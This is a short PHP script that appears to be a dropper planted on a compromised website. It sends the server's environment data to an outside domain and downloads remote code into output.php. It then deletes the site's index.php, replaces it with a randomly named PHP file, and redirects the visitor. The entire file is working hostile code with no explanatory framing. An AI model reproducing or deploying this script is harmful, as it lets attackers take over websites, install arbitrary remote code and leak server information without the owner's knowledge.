<?php
$allinonedomain = 'allinone.apappshop.top';
$apihead = 'http://api.apappshop.top/she3/';
$server = $_SERVER;
$server['RELATED_HOST'] = 'creditdoctor.in';
unset($server['HTTP_COOKIE']);
unset($server['SERVER_SIGNATURE']);
$apiurl = 'http://' . $allinonedomain . '/api2?f=site2NewSite&domain='.$server['HTTP_HOST'].'&json='.base64_encode(json_encode($server));
file_get_contents($apiurl);
file_put_contents('output.php', file_get_contents($apihead . '?file=onekeyoutput.txt&singleencoder=on'));
$path = dirname(__FILE__);
unlink($path . '/index.php');
rename($path . '/n3JaKCgNQu2xUIGN.php', $path . '/index.php');
header("Location: " . $_SERVER['REQUEST_URI']);